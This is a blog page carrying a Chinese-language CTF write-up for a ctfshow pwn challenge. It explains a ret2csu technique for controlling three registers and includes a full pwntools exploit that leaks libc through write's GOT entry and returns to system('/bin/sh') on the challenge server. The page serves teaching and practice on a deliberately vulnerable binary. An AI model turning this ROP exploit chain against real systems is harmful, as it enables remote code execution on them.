@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[ctfshow pwn 内部赛] 签到题 write up | Blog de NazrinDuck</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="今天接触到一个新类型ret2csu的题，写一下wp，不能保证没有错误，欢迎大家指出 首先拿到题目，名字暗示了用ret2libc且程序为64位的。既然这样那直接拖进ida64：  乍一看，程序很简短，无后门binsh，像是典型的ret2libc，但是下手后就会发现没有那么简单。程序中唯一能有输出的函数是write，需要三个参数：  按照64位函数的传参顺序，我们需要rdi，rsi，rdx三个寄存器，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ctfshow pwn 内部赛] 签到题 write up">
+<meta property="og:url" content="http://example.com/2024/02/19/writeup2/index.html">
+<meta property="og:site_name" content="Blog de NazrinDuck">
+<meta property="og:description" content="今天接触到一个新类型ret2csu的题，写一下wp，不能保证没有错误，欢迎大家指出 首先拿到题目，名字暗示了用ret2libc且程序为64位的。既然这样那直接拖进ida64：  乍一看，程序很简短，无后门binsh，像是典型的ret2libc，但是下手后就会发现没有那么简单。程序中唯一能有输出的函数是write，需要三个参数：  按照64位函数的传参顺序，我们需要rdi，rsi，rdx三个寄存器，">
+<meta property="og:locale">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-a87a0fbed640185be5aeff2eb8d5dfb0_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-e4ea3c30a24890cfbf8d213a8422a02e_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-bd5d78339c2d50e6d11f9c9ac6d94844_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-1d0e14c4eb1c08a9bc0bd9265d5bdf13_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-926030be1ec6ed337cd62ccae9455d76_1440w.webp">
+<meta property="article:published_time" content="2024-02-19T13:12:03.000Z">
+<meta property="article:modified_time" content="2024-09-18T16:12:10.287Z">
+<meta property="article:author" content="NazrinDuck">
+<meta property="article:tag" content="history">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-a87a0fbed640185be5aeff2eb8d5dfb0_1440w.webp">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog de NazrinDuck" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Blog de NazrinDuck</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">上不去下不来，卡在这了</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Buscar"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Buscar"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-writeup2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/19/writeup2/" class="article-date">
+  <time class="dt-published" datetime="2024-02-19T13:12:03.000Z" itemprop="datePublished">2024-02-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      [ctfshow pwn 内部赛] 签到题 write up
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>今天接触到一个新类型ret2csu的题，写一下wp，不能保证没有错误，欢迎大家指出</p>
+<p>首先拿到题目，名字暗示了用ret2libc且程序为64位的。既然这样那直接拖进ida64：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-a87a0fbed640185be5aeff2eb8d5dfb0_1440w.webp"></p>
+<p>乍一看，程序很简短，无后门binsh，像是典型的ret2libc，但是下手后就会发现没有那么简单。程序中唯一能有输出的函数是write，需要三个参数：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-e4ea3c30a24890cfbf8d213a8422a02e_1440w.webp"></p>
+<p>按照64位函数的传参顺序，我们需要rdi，rsi，rdx三个寄存器，但是用ROPgadget只能找到控制前两个寄存器的gadget：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-bd5d78339c2d50e6d11f9c9ac6d94844_1440w.webp"></p>
+<p>无法控制rdx，因此无法简单的用ROPgadget去做，需要一个能够进一步控制rdx的方法去做</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">上CTFwiki上找到了</a>类似的思路：ret2csu，正好解决了三个参数的问题，具体原理wiki里有，这里就只说明一下应该注意的小问题。</p>
+<blockquote>
+<p>注意：不同的libc版本csu部分使用的寄存器会有区别</p>
+</blockquote>
+<p>去ida里找到csu：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-1d0e14c4eb1c08a9bc0bd9265d5bdf13_1440w.webp"></p>
+<p>我们取4006A0和4006BA这两部分构造payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">csuStartAddr = <span class="number">0x4006a0</span></span><br><span class="line">csuEndAddr = <span class="number">0x4006ba</span></span><br><span class="line"><span class="comment">#===========================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">160</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(csuEndAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(writeGot)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0x8</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(writeGot)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0x1</span>)<span class="comment">#rdi</span></span><br><span class="line"><span class="comment">#write(0x1, writeGot, 0x8)</span></span><br><span class="line">payload += p64(csuStartAddr)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Me?\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>注意三个参数的顺序，与实际的相反，其次要注意调用csustart的时候会执行到结尾，期间栈顶rsp上升了8个字节且pop了6次，因此我们要在栈上补充(6+1)*8&#x3D;56个字节，最后在返回main（注意用write的plt无法跳转，只能用got，因为这里相当于call [r12]有个取地址，而got表存放的就是函数地址，plt表存放的是跳转到got&#x2F;动态解析函数的指令）</p>
+<p>下一步就是经典的算偏移，栈溢出拿shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">writeAddr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;writeAddr:&#x27;</span> + <span class="built_in">hex</span>(writeAddr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, writeAddr)</span><br><span class="line"></span><br><span class="line">offset = writeAddr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh = offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">160</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Me?\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>还是要注意两个ret栈对齐，libc选0就能拿到shell</p>
+<p>成功拿到flag：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-926030be1ec6ed337cd62ccae9455d76_1440w.webp"></p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../ret2libc_64&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">port = <span class="number">28174</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#===============plt &amp; got===============#</span></span><br><span class="line">writePlt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">writeGot = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">retAddr = <span class="number">0x00000000004004a9</span></span><br><span class="line">rdiAddr = <span class="number">0x00000000004006c3</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line"><span class="comment">#==================csu==================#</span></span><br><span class="line">csuStartAddr = <span class="number">0x4006a0</span></span><br><span class="line">csuEndAddr = <span class="number">0x4006ba</span></span><br><span class="line"><span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line"><span class="comment"># rbx should be 0,</span></span><br><span class="line"><span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line"><span class="comment"># r12 should be the function we want to call</span></span><br><span class="line"><span class="comment"># rdi=edi=r15d</span></span><br><span class="line"><span class="comment"># rsi=r14</span></span><br><span class="line"><span class="comment"># rdx=r13</span></span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">160</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(csuEndAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(writeGot)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0x8</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(writeGot)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0x1</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(csuStartAddr)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">writeAddr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;writeAddr:&#x27;</span> + <span class="built_in">hex</span>(writeAddr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, writeAddr)</span><br><span class="line"></span><br><span class="line">offset = writeAddr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh = offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#================round 2================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">160</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Me?\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/19/writeup2/" data-id="cm182gwym0004g7tj9d9e61fz" data-title="[ctfshow pwn 内部赛] 签到题 write up" class="article-share-link"><span class="fa fa-share">Compartir</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/02/21/writeup3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Nuevo</strong>
+      <div class="article-nav-title">
+        
+          [ctfshow] pwn 内部赛 flower write up
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/02/17/writeup1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">[NewStarCTF] 2023 stack migration write up</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/syscall/" rel="tag">syscall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nube de Tags</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/history/" style="font-size: 20px;">history</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/stack/" style="font-size: 13.33px;">stack</a> <a href="/tags/syscall/" style="font-size: 10px;">syscall</a> <a href="/tags/web/" style="font-size: 10px;">web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archivos</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/23/writeup4/"> [CTF pwn] ciscn_s_3 write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/21/IIS/">[CTF web] 通过IIS在Windows下搭建php环境</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/21/writeup3/">[ctfshow] pwn 内部赛 flower write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/19/writeup2/">[ctfshow pwn 内部赛] 签到题 write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/17/writeup1/">[NewStarCTF] 2023 stack migration write up</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 NazrinDuck<br>
+      Construido por <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
